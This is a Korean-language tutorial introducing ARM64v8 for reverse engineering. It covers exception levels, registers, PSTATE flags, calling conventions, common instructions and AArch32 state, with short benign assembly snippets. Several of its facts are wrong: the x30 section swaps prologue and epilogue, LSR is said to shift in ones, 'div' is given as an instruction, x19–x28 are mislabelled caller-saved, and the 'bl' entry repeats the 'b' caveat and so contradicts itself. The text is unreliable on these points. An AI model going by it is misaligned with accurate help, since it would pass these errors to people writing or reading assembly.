# ARM64v8 소개

{{#include ../../../banners/hacktricks-training.md}}

## **예외 수준 - EL (ARM64v8)**

ARMv8 아키텍처에서 실행 수준은 예외 수준(EL)으로 알려져 있으며, 실행 환경의 권한 수준과 기능을 정의합니다. EL0에서 EL3까지 네 가지 예외 수준이 있으며, 각각은 다른 목적을 가지고 있습니다:

1. **EL0 - 사용자 모드**:
- 가장 낮은 권한 수준으로, 일반 애플리케이션 코드를 실행하는 데 사용됩니다.
- EL0에서 실행되는 애플리케이션은 서로 및 시스템 소프트웨어와 격리되어 보안성과 안정성을 향상시킵니다.
2. **EL1 - 운영 체제 커널 모드**:
- 대부분의 운영 체제 커널은 이 수준에서 실행됩니다.
- EL1은 EL0보다 더 많은 권한을 가지며 시스템 리소스에 접근할 수 있지만, 시스템 무결성을 보장하기 위해 일부 제한이 있습니다.
3. **EL2 - 하이퍼바이저 모드**:
- 이 수준은 가상화를 위해 사용됩니다. EL2에서 실행되는 하이퍼바이저는 동일한 물리적 하드웨어에서 여러 운영 체제(각각 자신의 EL1에서 실행)를 관리할 수 있습니다.
- EL2는 가상화된 환경의 격리 및 제어 기능을 제공합니다.
4. **EL3 - 보안 모니터 모드**:
- 가장 높은 권한 수준으로, 보안 부팅 및 신뢰할 수 있는 실행 환경에 자주 사용됩니다.
- EL3는 보안 및 비보안 상태 간의 접근을 관리하고 제어할 수 있습니다(예: 보안 부팅, 신뢰할 수 있는 OS 등).

이러한 수준의 사용은 사용자 애플리케이션에서 가장 권한이 높은 시스템 소프트웨어에 이르기까지 시스템의 다양한 측면을 구조적이고 안전하게 관리할 수 있는 방법을 제공합니다. ARMv8의 권한 수준 접근 방식은 서로 다른 시스템 구성 요소를 효과적으로 격리하는 데 도움을 주어 시스템의 보안성과 견고성을 향상시킵니다.

## **레지스터 (ARM64v8)**

ARM64에는 `x0`에서 `x30`까지 레이블이 붙은 **31개의 일반 목적 레지스터**가 있습니다. 각 레지스터는 **64비트**(8바이트) 값을 저장할 수 있습니다. 32비트 값만 필요한 작업의 경우, 동일한 레지스터는 w0에서 w30까지의 이름을 사용하여 32비트 모드에서 접근할 수 있습니다.

1. **`x0`**에서 **`x7`** - 일반적으로 스크래치 레지스터 및 서브루틴에 매개변수를 전달하는 데 사용됩니다.
- **`x0`**는 함수의 반환 데이터를 전달합니다.
2. **`x8`** - 리눅스 커널에서 `x8`은 `svc` 명령어의 시스템 호출 번호로 사용됩니다. **macOS에서는 x16이 사용됩니다!**
3. **`x9`**에서 **`x15`** - 더 많은 임시 레지스터로, 종종 지역 변수를 위해 사용됩니다.
4. **`x16`** 및 **`x17`** - **프로시저 내 호출 레지스터**. 즉각적인 값을 위한 임시 레지스터입니다. 간접 함수 호출 및 PLT(프로시저 링크 테이블) 스텁에도 사용됩니다.
- **`x16`**은 **macOS**에서 **`svc`** 명령어의 **시스템 호출 번호**로 사용됩니다.
5. **`x18`** - **플랫폼 레지스터**. 일반 목적 레지스터로 사용할 수 있지만, 일부 플랫폼에서는 이 레지스터가 플랫폼 특정 용도로 예약되어 있습니다: Windows의 현재 스레드 환경 블록에 대한 포인터 또는 리눅스 커널의 현재 **실행 중인 작업 구조**를 가리킵니다.
6. **`x19`**에서 **`x28`** - 이들은 호출자 저장 레지스터입니다. 함수는 호출자를 위해 이러한 레지스터의 값을 보존해야 하므로, 스택에 저장되고 호출자에게 돌아가기 전에 복구됩니다.
7. **`x29`** - 스택 프레임을 추적하기 위한 **프레임 포인터**입니다. 함수가 호출되어 새로운 스택 프레임이 생성되면, **`x29`** 레지스터는 **스택에 저장**되고 **새로운** 프레임 포인터 주소(**`sp`** 주소)가 **이 레지스터에 저장**됩니다.
- 이 레지스터는 일반적으로 **지역 변수**에 대한 참조로 사용되지만, **일반 목적 레지스터**로도 사용할 수 있습니다.
8. **`x30`** 또는 **`lr`** - **링크 레지스터**. `BL`(링크가 있는 분기) 또는 `BLR`(레지스터로 링크가 있는 분기) 명령어가 실행될 때 **반환 주소**를 보유하며, **`pc`** 값을 이 레지스터에 저장합니다.
- 다른 레지스터처럼 사용할 수도 있습니다.
- 현재 함수가 새로운 함수를 호출하고 따라서 `lr`을 덮어쓸 경우, 시작 시 스택에 저장합니다. 이것이 에필로그입니다(`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`와 `lr` 저장, 공간 생성 및 새로운 `fp` 가져오기) 및 끝에서 복구합니다. 이것이 프로롤로그입니다(`ldp x29, x30, [sp], #48; ret` -> `fp`와 `lr` 복구 및 반환).
9. **`sp`** - **스택 포인터**, 스택의 맨 위를 추적하는 데 사용됩니다.
- **`sp`** 값은 항상 최소한 **쿼드워드** **정렬**을 유지해야 하며, 그렇지 않으면 정렬 예외가 발생할 수 있습니다.
10. **`pc`** - **프로그램 카운터**, 다음 명령어를 가리킵니다. 이 레지스터는 예외 생성, 예외 반환 및 분기를 통해서만 업데이트할 수 있습니다. 이 레지스터를 읽을 수 있는 유일한 일반 명령어는 링크가 있는 분기 명령어(BL, BLR)로, **`pc`** 주소를 **`lr`**(링크 레지스터)에 저장합니다.
11. **`xzr`** - **제로 레지스터**. 32비트 레지스터 형태에서는 **`wzr`**라고도 불립니다. 제로 값을 쉽게 얻거나(일반적인 작업) **`subs`**를 사용하여 비교를 수행하는 데 사용할 수 있습니다. 예: **`subs XZR, Xn, #10`** 결과 데이터를 어디에도 저장하지 않습니다( **`xzr`**에 저장).

**`Wn`** 레지스터는 **`Xn`** 레지스터의 **32비트** 버전입니다.

### SIMD 및 부동 소수점 레지스터

또한 최적화된 단일 명령어 다중 데이터(SIMD) 작업 및 부동 소수점 산술을 수행하는 데 사용할 수 있는 **128비트 길이의 32개 레지스터**가 있습니다. 이들은 Vn 레지스터라고 불리며, **64**비트, **32**비트, **16**비트 및 **8**비트로도 작동할 수 있으며, 그 경우 **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** 및 **`Bn`**이라고 불립니다.

### 시스템 레지스터

**수백 개의 시스템 레지스터**가 있으며, 특별 목적 레지스터(SPR)라고도 하며, **프로세서** 동작을 **모니터링**하고 **제어**하는 데 사용됩니다.\
이들은 전용 특별 명령어 **`mrs`** 및 **`msr`**를 사용하여 읽거나 설정할 수 있습니다.

특별 레지스터 **`TPIDR_EL0`** 및 **`TPIDDR_EL0`**는 리버스 엔지니어링 시 일반적으로 발견됩니다. `EL0` 접미사는 레지스터에 접근할 수 있는 **최소 예외**를 나타냅니다(이 경우 EL0는 일반 프로그램이 실행되는 일반 예외(권한) 수준입니다).\
이들은 종종 메모리의 **스레드 로컬 저장소** 영역의 **기본 주소**를 저장하는 데 사용됩니다. 일반적으로 첫 번째는 EL0에서 실행되는 프로그램에 대해 읽기 및 쓰기가 가능하지만, 두 번째는 EL0에서 읽을 수 있고 EL1에서 쓸 수 있습니다(커널처럼).

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0를 x0에 읽기`
- `msr TPIDR_EL0, X0 ; x0를 TPIDR_EL0에 쓰기`

### **PSTATE**

**PSTATE**는 운영 체제에서 볼 수 있는 **`SPSR_ELx`** 특별 레지스터에 직렬화된 여러 프로세스 구성 요소를 포함하고 있으며, X는 트리거된 예외의 **권한** **수준**을 나타냅니다(이는 예외가 끝날 때 프로세스 상태를 복구할 수 있게 합니다).\
접근 가능한 필드는 다음과 같습니다:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** 및 **`V`** 조건 플래그:
- **`N`**은 연산이 음수 결과를 산출했음을 의미합니다.
- **`Z`**는 연산이 제로 결과를 산출했음을 의미합니다.
- **`C`**는 연산이 캐리되었음을 의미합니다.
- **`V`**는 연산이 부호 오버플로우를 산출했음을 의미합니다:
- 두 개의 양수의 합이 음수 결과를 산출합니다.
- 두 개의 음수의 합이 양수 결과를 산출합니다.
- 뺄셈에서 큰 음수를 작은 양수에서 빼거나(또는 그 반대의 경우), 결과가 주어진 비트 크기 범위 내에서 표현될 수 없는 경우입니다.
- 명백히 프로세서는 연산이 부호가 있는지 없는지를 알 수 없으므로, 연산에서 C와 V를 확인하고 부호가 있는 경우 또는 없는 경우 캐리가 발생했음을 나타냅니다.

> [!WARNING]
> 모든 명령어가 이러한 플래그를 업데이트하는 것은 아닙니다. **`CMP`** 또는 **`TST`**와 같은 일부는 업데이트하며, **`ADDS`**와 같은 s 접미사가 있는 다른 명령어도 업데이트합니다.

- 현재 **레지스터 너비(`nRW`) 플래그**: 플래그가 0 값을 가지면 프로그램이 재개될 때 AArch64 실행 상태에서 실행됩니다.
- 현재 **예외 수준**(**`EL`**): EL0에서 실행되는 일반 프로그램은 값 0을 가집니다.
- **단일 스텝** 플래그(**`SS`**): 디버거가 예외를 통해 **`SPSR_ELx`** 내에서 SS 플래그를 1로 설정하여 단일 스텝을 수행하는 데 사용됩니다. 프로그램은 한 단계를 실행하고 단일 스텝 예외를 발생시킵니다.
- **불법 예외** 상태 플래그(**`IL`**): 권한 있는 소프트웨어가 잘못된 예외 수준 전환을 수행할 때 표시하는 데 사용되며, 이 플래그는 1로 설정되고 프로세서는 불법 상태 예외를 트리거합니다.
- **`DAIF`** 플래그: 이러한 플래그는 권한 있는 프로그램이 특정 외부 예외를 선택적으로 마스킹할 수 있게 합니다.
- **`A`**가 1이면 **비동기 중단**이 트리거됩니다. **`I`**는 외부 하드웨어 **인터럽트 요청**(IRQ)에 응답하도록 구성합니다. F는 **빠른 인터럽트 요청**(FIR)과 관련이 있습니다.
- **스택 포인터 선택** 플래그(**`SPS`**): EL1 이상에서 실행되는 권한 있는 프로그램은 자신의 스택 포인터 레지스터와 사용자 모델 스택 포인터 간에 전환할 수 있습니다(예: `SP_EL1`과 `EL0` 간). 이 전환은 **`SPSel`** 특별 레지스터에 쓰기를 통해 수행됩니다. EL0에서는 수행할 수 없습니다.

## **호출 규약 (ARM64v8)**

ARM64 호출 규약은 함수에 대한 **첫 번째 여덟 개 매개변수**가 레지스터 **`x0`**에서 **`x7`**까지 전달된다고 명시합니다. **추가** 매개변수는 **스택**에 전달됩니다. **반환** 값은 레지스터 **`x0`**에 반환되거나, **128비트 길이**인 경우 **`x1`**에도 반환됩니다. **`x19`**에서 **`x30`** 및 **`sp`** 레지스터는 함수 호출 간에 **보존**되어야 합니다.

어셈블리에서 함수를 읽을 때는 **함수 프로롤로그 및 에필로그**를 찾아야 합니다. **프로롤로그**는 일반적으로 **프레임 포인터(`x29`) 저장**, **새로운 프레임 포인터 설정**, 및 **스택 공간 할당**을 포함합니다. **에필로그**는 일반적으로 **저장된 프레임 포인터 복원** 및 **함수에서 반환**하는 것을 포함합니다.

### Swift의 호출 규약

Swift는 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)에서 찾을 수 있는 자체 **호출 규약**을 가지고 있습니다.

## **일반 명령어 (ARM64v8)**

ARM64 명령어는 일반적으로 **형식 `opcode dst, src1, src2`**를 가지며, 여기서 **`opcode`**는 수행할 **작업**(예: `add`, `sub`, `mov` 등), **`dst`**는 결과가 저장될 **목적지** 레지스터, **`src1`** 및 **`src2`**는 **출처** 레지스터입니다. 즉각적인 값도 출처 레지스터 대신 사용할 수 있습니다.

- **`mov`**: 한 **레지스터**에서 다른 레지스터로 값을 **이동**합니다.
- 예: `mov x0, x1` — 이 명령은 `x1`의 값을 `x0`로 이동합니다.
- **`ldr`**: **메모리**에서 **레지스터**로 값을 **로드**합니다.
- 예: `ldr x0, [x1]` — 이 명령은 `x1`이 가리키는 메모리 위치에서 값을 `x0`로 로드합니다.
- **오프셋 모드**: 원래 포인터에 영향을 미치는 오프셋이 표시됩니다. 예를 들어:
- `ldr x2, [x1, #8]`, 이는 `x1 + 8`에서 값을 x2로 로드합니다.
- `ldr x2, [x0, x1, lsl #2]`, 이는 x0의 배열에서 x1(인덱스) 위치 \* 4에서 객체를 x2로 로드합니다.
- **사전 인덱스 모드**: 원본에 계산을 적용하고 결과를 얻은 후 원본에 새로운 원본을 저장합니다.
- `ldr x2, [x1, #8]!`, 이는 `x1 + 8`을 x2로 로드하고 x1에 `x1 + 8`의 결과를 저장합니다.
- `str lr, [sp, #-4]!`, 링크 레지스터를 sp에 저장하고 레지스터 sp를 업데이트합니다.
- **후 인덱스 모드**: 이전과 비슷하지만 메모리 주소에 접근한 후 오프셋이 계산되고 저장됩니다.
- `ldr x0, [x1], #8`, `x1`을 `x0`로 로드하고 `x1`을 `x1 + 8`로 업데이트합니다.
- **PC 상대 주소 지정**: 이 경우 로드할 주소는 PC 레지스터에 상대적으로 계산됩니다.
- `ldr x1, =_start`, 이는 `_start` 기호가 시작하는 주소를 현재 PC에 상대적으로 x1에 로드합니다.
- **`str`**: **레지스터**에서 **메모리**로 값을 **저장**합니다.
- 예: `str x0, [x1]` — 이 명령은 `x0`의 값을 `x1`이 가리키는 메모리 위치에 저장합니다.
- **`ldp`**: **레지스터 쌍 로드**. 이 명령은 **연속 메모리** 위치에서 두 레지스터를 **로드**합니다. 메모리 주소는 일반적으로 다른 레지스터의 값에 오프셋을 추가하여 형성됩니다.
- 예: `ldp x0, x1, [x2]` — 이 명령은 `x2` 및 `x2 + 8`의 메모리 위치에서 `x0` 및 `x1`을 로드합니다.
- **`stp`**: **레지스터 쌍 저장**. 이 명령은 **연속 메모리** 위치에 두 레지스터를 **저장**합니다. 메모리 주소는 일반적으로 다른 레지스터의 값에 오프셋을 추가하여 형성됩니다.
- 예: `stp x0, x1, [sp]` — 이 명령은 `sp` 및 `sp + 8`의 메모리 위치에 `x0` 및 `x1`을 저장합니다.
- `stp x0, x1, [sp, #16]!` — 이 명령은 `sp+16` 및 `sp + 24`의 메모리 위치에 `x0` 및 `x1`을 저장하고 `sp`를 `sp+16`으로 업데이트합니다.
- **`add`**: 두 레지스터의 값을 더하고 결과를 레지스터에 저장합니다.
- 구문: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 목적지
- Xn2 -> 피연산자 1
- Xn3 | #imm -> 피연산자 2(레지스터 또는 즉각적인 값)
- \[shift #N | RRX] -> 시프트를 수행하거나 RRX를 호출합니다.
- 예: `add x0, x1, x2` — 이 명령은 `x1`과 `x2`의 값을 더하고 결과를 `x0`에 저장합니다.
- `add x5, x5, #1, lsl #12` — 이는 4096과 같습니다(1을 12번 시프트) -> 1 0000 0000 0000 0000
- **`adds`**: 이는 `add`를 수행하고 플래그를 업데이트합니다.
- **`sub`**: 두 레지스터의 값을 빼고 결과를 레지스터에 저장합니다.
- **`add`** **구문**을 확인하십시오.
- 예: `sub x0, x1, x2` — 이 명령은 `x2`의 값을 `x1`에서 빼고 결과를 `x0`에 저장합니다.
- **`subs`**: 이는 sub와 같지만 플래그를 업데이트합니다.
- **`mul`**: 두 레지스터의 값을 곱하고 결과를 레지스터에 저장합니다.
- 예: `mul x0, x1, x2` — 이 명령은 `x1`과 `x2`의 값을 곱하고 결과를 `x0`에 저장합니다.
- **`div`**: 한 레지스터의 값을 다른 레지스터로 나누고 결과를 레지스터에 저장합니다.
- 예: `div x0, x1, x2` — 이 명령은 `x1`의 값을 `x2`로 나누고 결과를 `x0`에 저장합니다.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **논리적 왼쪽 시프트**: 끝에서 0을 추가하여 다른 비트를 앞으로 이동시킵니다(2배 곱하기).
- **논리적 오른쪽 시프트**: 시작에서 1을 추가하여 다른 비트를 뒤로 이동시킵니다(부호 없는 경우 2배 나누기).
- **산술적 오른쪽 시프트**: **`lsr`**와 같지만, 가장 중요한 비트가 1인 경우 0 대신 1을 추가합니다(부호 있는 경우 n배 나누기).
- **오른쪽 회전**: **`lsr`**와 같지만 오른쪽에서 제거된 것은 왼쪽에 추가됩니다.
- **확장된 오른쪽 회전**: **`ror`**와 같지만 캐리 플래그가 "가장 중요한 비트"로 사용됩니다. 따라서 캐리 플래그는 비트 31로 이동하고 제거된 비트는 캐리 플래그로 이동합니다.
- **`bfm`**: **비트 필드 이동**, 이러한 작업은 **값에서 `0...n` 비트를 복사하여** **`m..m+n`** 위치에 배치합니다. **`#s`**는 **가장 왼쪽 비트** 위치를 지정하고 **`#r`**은 **오른쪽 회전 양**을 지정합니다.
- 비트 필드 이동: `BFM Xd, Xn, #r`
- 부호 있는 비트 필드 이동: `SBFM Xd, Xn, #r, #s`
- 부호 없는 비트 필드 이동: `UBFM Xd, Xn, #r, #s`
- **비트 필드 추출 및 삽입:** 레지스터에서 비트 필드를 복사하여 다른 레지스터에 복사합니다.
- **`BFI X1, X2, #3, #4`**: X1의 3번째 비트에서 X2의 4비트를 삽입합니다.
- **`BFXIL X1, X2, #3, #4`**: X2의 3번째 비트에서 4비트를 추출하여 X1에 복사합니다.
- **`SBFIZ X1, X2, #3, #4`**: X2에서 4비트를 부호 확장하여 X1에 비트 위치 3에서 삽입하고 오른쪽 비트를 0으로 설정합니다.
- **`SBFX X1, X2, #3, #4`**: X2의 3번째 비트에서 4비트를 추출하고 부호 확장하여 결과를 X1에 배치합니다.
- **`UBFIZ X1, X2, #3, #4`**: X2에서 4비트를 0으로 확장하여 X1에 비트 위치 3에서 삽입하고 오른쪽 비트를 0으로 설정합니다.
- **`UBFX X1, X2, #3, #4`**: X2의 3번째 비트에서 4비트를 추출하고 0으로 확장된 결과를 X1에 배치합니다.
- **부호 확장 X로:** 값을 부호 확장(또는 부호 없는 버전에서는 0을 추가)하여 연산을 수행할 수 있도록 합니다:
- **`SXTB X1, W2`**: W2에서 X1로 바이트의 부호를 확장하여 64비트를 채웁니다(`W2`는 `X2`의 절반입니다).
- **`SXTH X1, W2`**: W2에서 X1로 16비트 숫자의 부호를 확장하여 64비트를 채웁니다.
- **`SXTW X1, W2`**: W2에서 X1로 바이트의 부호를 확장하여 64비트를 채웁니다.
- **`UXTB X1, W2`**: W2에서 X1로 0을 추가하여 64비트를 채웁니다(부호 없는).
- **`extr`:** 지정된 **레지스터 쌍에서 비트를 추출**합니다.
- 예: `EXTR W3, W2, W1, #3` — 이는 **W1+W2를 연결**하고 **W2의 비트 3부터 W1의 비트 3까지** 가져와 W3에 저장합니다.
- **`cmp`**: 두 레지스터를 **비교**하고 조건 플래그를 설정합니다. 이는 **`subs`**의 **별칭**으로, 목적지 레지스터를 제로 레지스터로 설정합니다. `m == n`인지 확인하는 데 유용합니다.
- **`subs`**와 동일한 구문을 지원합니다.
- 예: `cmp x0, x1` — 이 명령은 `x0`와 `x1`의 값을 비교하고 조건 플래그를 적절히 설정합니다.
- **`cmn`**: **부정 피연산자**를 비교합니다. 이 경우 **`adds`**의 **별칭**이며 동일한 구문을 지원합니다. `m == -n`인지 확인하는 데 유용합니다.
- **`ccmp`**: 조건부 비교로, 이전 비교가 참인 경우에만 수행되는 비교이며 nzcv 비트를 특별히 설정합니다.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2이고 x3 < x4인 경우 func로 점프합니다.
- 이는 **`ccmp`**가 **이전 `cmp`가 `NE`인 경우에만 실행되기 때문입니다**. 그렇지 않으면 비트 `nzcv`는 0으로 설정됩니다(이는 `blt` 비교를 만족하지 않습니다).
- 이는 `ccmn`으로도 사용될 수 있습니다(부정적인 경우, `cmp`와 `cmn`처럼).
- **`tst`**: 비교의 값 중 하나라도 1인지 확인합니다(결과를 어디에도 저장하지 않는 ANDS처럼 작동합니다). 레지스터의 값을 확인하고 해당 값의 비트 중 하나가 1인지 확인하는 데 유용합니다.
- 예: `tst X1, #7` — X1의 마지막 3비트 중 하나라도 1인지 확인합니다.
- **`teq`**: 결과를 버리는 XOR 연산입니다.
- **`b`**: 무조건 분기합니다.
- 예: `b myFunction`
- 이 명령은 링크 레지스터에 반환 주소를 채우지 않으므로(반환이 필요한 서브루틴 호출에 적합하지 않음) 주의해야 합니다.
- **`bl`**: **링크가 있는 분기**, **서브루틴을 호출**하는 데 사용됩니다. **반환 주소를 `x30`에 저장**합니다.
- 예: `bl myFunction` — 이 명령은 `myFunction`을 호출하고 반환 주소를 `x30`에 저장합니다.
- 이 명령은 링크 레지스터에 반환 주소를 채우지 않으므로(반환이 필요한 서브루틴 호출에 적합하지 않음) 주의해야 합니다.
- **`blr`**: **레지스터로 링크가 있는 분기**, **서브루틴을 호출**하는 데 사용되며, 대상이 **레지스터에 지정**됩니다. 반환 주소는 `x30`에 저장됩니다.
- 예: `blr x1` — 이 명령은 `x1`에 포함된 주소의 함수를 호출하고 반환 주소를 `x30`에 저장합니다.
- **`ret`**: **서브루틴에서 반환**하며, 일반적으로 **`x30`**의 주소를 사용합니다.
- 예: `ret` — 이 명령은 현재 서브루틴에서 반환하며 `x30`의 반환 주소를 사용합니다.
- **`b.<cond>`**: 조건부 분기입니다.
- **`b.eq`**: **같으면 분기**, 이전 `cmp` 명령어를 기반으로 합니다.
- 예: `b.eq label` — 이전 `cmp` 명령어가 두 값을 같다고 찾으면, 이 명령은 `label`로 점프합니다.
- **`b.ne`**: **같지 않으면 분기**. 이 명령은 조건 플래그를 확인하며(이전 비교 명령어에 의해 설정됨), 비교된 값이 같지 않으면 레이블이나 주소로 분기합니다.
- 예: `cmp x0, x1` 명령어 후, `b.ne label` — `x0`와 `x1`의 값이 같지 않으면 이 명령은 `label`로 점프합니다.
- **`cbz`**: **제로와 비교하고 분기**. 이 명령은 레지스터를 제로와 비교하며, 같으면 레이블이나 주소로 분기합니다.
- 예: `cbz x0, label` — `x0`의 값이 제로이면 이 명령은 `label`로 점프합니다.
- **`cbnz`**: **비제로와 비교하고 분기**. 이 명령은 레지스터를 제로와 비교하며, 같지 않으면 레이블이나 주소로 분기합니다.
- 예: `cbnz x0, label` — `x0`의 값이 비제로이면 이 명령은 `label`로 점프합니다.
- **`tbnz`**: 비트를 테스트하고 비제로일 때 분기합니다.
- 예: `tbnz x0, #8, label`
- **`tbz`**: 비트를 테스트하고 제로일 때 분기합니다.
- 예: `tbz x0, #8, label`
- **조건부 선택 작업**: 이러한 작업은 조건 비트에 따라 동작이 달라집니다.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 참이면 X0 = X1, 거짓이면 X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 참이면 Xd = Xn + 1, 거짓이면 Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 참이면 Xd = NOT(Xn), 거짓이면 Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = - Xm
- `cneg Xd, Xn, cond` -> 참이면 Xd = - Xn, 거짓이면 Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 참이면 Xd = 1, 거짓이면 Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 참이면 Xd = \<모두 1>, 거짓이면 Xd = 0
- **`adrp`**: **기호의 페이지 주소를 계산**하고 레지스터에 저장합니다.
- 예: `adrp x0, symbol` — 이 명령은 `symbol`의 페이지 주소를 계산하고 `x0`에 저장합니다.
- **`ldrsw`**: **메모리에서 부호 있는 32비트** 값을 **로드하고 64비트로 부호 확장**합니다.
- 예: `ldrsw x0, [x1]` — 이 명령은 `x1`이 가리키는 메모리 위치에서 부호 있는 32비트 값을 로드하고, 이를 64비트로 부호 확장하여 `x0`에 저장합니다.
- **`stur`**: **레지스터 값을 메모리 위치에 저장**하며, 다른 레지스터에서 오프셋을 사용합니다.
- 예: `stur x0, [x1, #4]` — 이 명령은 `x0`의 값을 `x1`의 주소보다 4바이트 더 큰 메모리 주소에 저장합니다.
- **`svc`**: **시스템 호출**을 수행합니다. "Supervisor Call"의 약자입니다. 프로세서가 이 명령어를 실행하면 **사용자 모드에서 커널 모드로 전환**되고, **커널의 시스템 호출 처리** 코드가 있는 메모리의 특정 위치로 점프합니다.

- 예:

```armasm
mov x8, 93  ; 종료를 위한 시스템 호출 번호(93)를 레지스터 x8에 로드합니다.
mov x0, 0   ; 종료 상태 코드(0)를 레지스터 x0에 로드합니다.
svc 0       ; 시스템 호출을 수행합니다.
```

### **함수 프로롤로그**

1. **링크 레지스터와 프레임 포인터를 스택에 저장**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **새 프레임 포인터 설정**: `mov x29, sp` (현재 함수에 대한 새 프레임 포인터를 설정)
3. **로컬 변수를 위한 스택 공간 할당 (필요한 경우)**: `sub sp, sp, <size>` (여기서 `<size>`는 필요한 바이트 수)

### **함수 에필로그**

1. **로컬 변수 해제 (할당된 경우)**: `add sp, sp, <size>`
2. **링크 레지스터와 프레임 포인터 복원**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (호출자에게 링크 레지스터의 주소를 사용하여 제어를 반환)

## AARCH32 실행 상태

Armv8-A는 32비트 프로그램의 실행을 지원합니다. **AArch32**는 **두 가지 명령어 집합** 중 하나인 **`A32`**와 **`T32`**에서 실행될 수 있으며, **`interworking`**을 통해 이들 간에 전환할 수 있습니다.\
**특권** 64비트 프로그램은 낮은 특권 32비트로의 예외 수준 전환을 실행하여 **32비트** 프로그램의 **실행을 예약**할 수 있습니다.\
64비트에서 32비트로의 전환은 예외 수준의 하강과 함께 발생합니다(예: EL1의 64비트 프로그램이 EL0의 프로그램을 트리거하는 경우). 이는 `AArch32` 프로세스 스레드가 실행 준비가 되었을 때 **`SPSR_ELx`** 특수 레지스터의 **비트 4를 1로 설정**하여 수행되며, 나머지 `SPSR_ELx`는 **`AArch32`** 프로그램의 CPSR을 저장합니다. 그런 다음, 특권 프로세스는 **`ERET`** 명령어를 호출하여 프로세서가 CPSR에 따라 A32 또는 T32로 **`AArch32`**로 전환되도록 합니다. 

**`interworking`**은 CPSR의 J 및 T 비트를 사용하여 발생합니다. `J=0` 및 `T=0`은 **`A32`**를 의미하고, `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 **최하위 비트를 1로 설정**하여 명령어 집합이 T32임을 나타내는 것입니다.\
이는 **interworking 분기 명령어** 중에 설정되지만, PC가 목적 레지스터로 설정될 때 다른 명령어로도 직접 설정할 수 있습니다. 예: 

또 다른 예:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 레지스터

16개의 32비트 레지스터(r0-r15)가 있습니다. **r0에서 r14까지**는 **모든 작업**에 사용할 수 있지만, 그 중 일부는 일반적으로 예약되어 있습니다:

- **`r15`**: 프로그램 카운터(항상). 다음 명령어의 주소를 포함합니다. A32에서는 현재 + 8, T32에서는 현재 + 4입니다.
- **`r11`**: 프레임 포인터
- **`r12`**: 절차 내 호출 레지스터
- **`r13`**: 스택 포인터
- **`r14`**: 링크 레지스터

또한, 레지스터는 **`뱅크 레지스터`**에 백업됩니다. 이는 레지스터 값을 저장하여 예외 처리 및 특권 작업에서 **빠른 컨텍스트 전환**을 수행할 수 있게 해줍니다. 매번 레지스터를 수동으로 저장하고 복원할 필요가 없습니다.\
이는 **예외가 발생한 프로세서 모드의 `CPSR`에서 `SPSR`로 프로세서 상태를 저장함으로써** 이루어집니다. 예외가 반환될 때, **`CPSR`**는 **`SPSR`**에서 복원됩니다.

### CPSR - 현재 프로그램 상태 레지스터

AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 작동하며, 예외가 발생할 때 나중에 실행을 복원하기 위해 **`SPSR_ELx`**에 저장됩니다:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

필드는 몇 개의 그룹으로 나뉩니다:

- 응용 프로그램 상태 레지스터(APSR): 산술 플래그 및 EL0에서 접근 가능
- 실행 상태 레지스터: 프로세스 동작(운영 체제에 의해 관리됨).

#### 응용 프로그램 상태 레지스터(APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** 플래그( AArch64와 동일)
- **`Q`** 플래그: 특수한 포화 산술 명령어 실행 중 **정수 포화가 발생할 때** 1로 설정됩니다. **`1`**로 설정되면 수동으로 0으로 설정될 때까지 값을 유지합니다. 또한, 이 값의 상태를 암묵적으로 확인하는 명령어는 없으며, 수동으로 읽어야 합니다.
- **`GE`** (크거나 같음) 플래그: SIMD(단일 명령어, 다중 데이터) 작업에서 사용되며, "병렬 덧셈" 및 "병렬 뺄셈"과 같은 작업을 포함합니다. 이러한 작업은 단일 명령어로 여러 데이터 포인트를 처리할 수 있게 해줍니다.

예를 들어, **`UADD8`** 명령어는 **네 쌍의 바이트**(두 개의 32비트 피연산자에서)를 병렬로 더하고 결과를 32비트 레지스터에 저장합니다. 그런 다음 **`APSR`**에서 이러한 결과를 기반으로 **`GE` 플래그를 설정합니다**. 각 GE 플래그는 바이트 쌍의 덧셈이 **오버플로우**되었는지를 나타냅니다.

**`SEL`** 명령어는 이러한 GE 플래그를 사용하여 조건부 작업을 수행합니다.

#### 실행 상태 레지스터

- **`J`** 및 **`T`** 비트: **`J`**는 0이어야 하며, **`T`**가 0이면 A32 명령어 세트가 사용되고, 1이면 T32가 사용됩니다.
- **IT 블록 상태 레지스터**(`ITSTATE`): 10-15 및 25-26의 비트입니다. 이들은 **`IT`** 접두사가 붙은 그룹 내의 명령어 조건을 저장합니다.
- **`E`** 비트: **엔디안**을 나타냅니다.
